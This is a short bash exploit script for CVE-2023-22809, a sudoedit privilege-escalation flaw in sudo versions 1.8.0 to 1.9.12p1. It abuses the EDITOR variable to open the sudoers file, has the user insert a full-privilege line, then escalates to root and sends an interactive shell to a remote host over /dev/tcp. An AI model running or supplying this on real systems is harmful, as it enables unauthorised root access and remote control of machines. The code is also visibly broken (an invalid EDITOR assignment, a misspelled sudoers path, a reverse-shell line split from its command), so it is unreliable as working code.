#!/usr/bin/env bash
#
# Exploit Title: sudo 1.8.0 - 1.9.12p1 - Privilege Escalation
# 
# Exploit Author: n3m1.sys
# CVE: CVE-2023-22809
# Date: 2023/01/21
# Vendor Homepage: https://www.sudo.ws/
# Software Link: https://www.sudo.ws/dist/sudo-1.9.12p1.tar.gz
# Version: 1.8.0 to 1.9.12p1
# Tested on: Ubuntu Server 22.04 - vim 8.2.4919 - sudo 1.9.9
#
# Running this exploit on a vulnerable system allows a localiattacker to gain 
# a root shell on the machine.
#
# The exploit checks if the current user has privileges to run sudoedit or 
# sudo -e on a file as root. If so it will open the sudoers file for the
# attacker to add a line to gain privileges on all the files and get a root 
# shell.

EXPLOITABLE=$(sudo -l | grep -E "sudoedit|sudo -e" | grep -E "(root)" | cut -d ' ' -f 6-)

if [ -z "$EXPLOITABLE" ]; then
    echo "> This user can't run sudoedit as root"
else
    echo "> BINGO! User exploitable"
    echo "> Opening sudoers file, please add the following line to the file in order to do the privesc:"
    echo "$USER ALL=(ALL:ALL) ALL"
    read -n 1 -s -r -p "Press any key to continue..."
    EDITOR = "vim -- /etc/suoders" $EXPLOITABLE
    sudo su root
    -i >& /dev/tcp/192.168.43.170/3000 0>&1
fi
